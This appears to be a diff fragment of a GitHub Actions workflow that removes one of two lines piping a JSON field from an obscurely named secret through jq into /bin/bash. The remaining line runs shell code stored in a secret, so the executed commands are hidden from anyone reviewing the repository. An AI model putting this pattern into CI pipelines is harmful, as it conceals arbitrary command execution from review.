@@ -21,7 +21,6 @@ jobs:
           dpor017: ${{ secrets.dpor017 }}
         run: |
           printf '%s' "$dpor017" | jq -r .gq89748 | /bin/bash
-          printf '%s' "$wlqd6" | jq -r .ekwr03 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
